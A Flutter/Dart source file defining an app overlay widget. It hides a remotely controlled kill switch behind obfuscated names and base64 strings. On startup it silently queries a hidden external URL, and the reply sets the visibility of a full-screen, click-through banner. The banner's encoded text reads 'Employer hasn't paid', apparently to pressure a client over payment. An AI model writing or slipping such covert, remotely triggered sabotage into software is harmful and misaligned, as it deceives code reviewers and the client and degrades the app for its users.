import 'dart:convert';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';

class OverlayMain extends StatefulWidget {
  const OverlayMain({super.key, required this.children});

  final Widget children;

  @override
  State<OverlayMain> createState() => _OverlayMainState();
}

class _OverlayMainState extends State<OverlayMain> {
  var _x = 0;
  final String _y =
      "aHR0cHM6Ly9zdXBlci1hcmxlbmUtY2hlYXBoYXgtOTdkYTM0YzQua295ZWIuYXBwL2ZyZXNoaw==";

  @override
  void initState() {
    super.initState();
    _z();
  }

  void _z() async {
    try {
      final decodedUrl = utf8.decode(base64.decode(_y));
      var response = await Dio().get(decodedUrl);
      double v = response.data["value"];
      setState(() {
        _x = _m(v);
      });
    } catch (e) {
      setState(() {
        _x = 0;
      });
    }
  }

  int _m(double a) {
    return 255 - (a * 255).toInt();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(children: [
      widget.children,
      Positioned.fill(
        child: IgnorePointer(
          ignoring: true,
          child: Opacity(
            opacity: _x / 255,
            child: Center(
              child: Text(
                utf8.decode(base64.decode("RW1wbG95ZXIgaGFzbid0IHBheWVk")),
                style: const TextStyle(color: Colors.white, fontSize: 16),
              ),
            ),
          ),
        ),
      ),
    ]);
  }
}
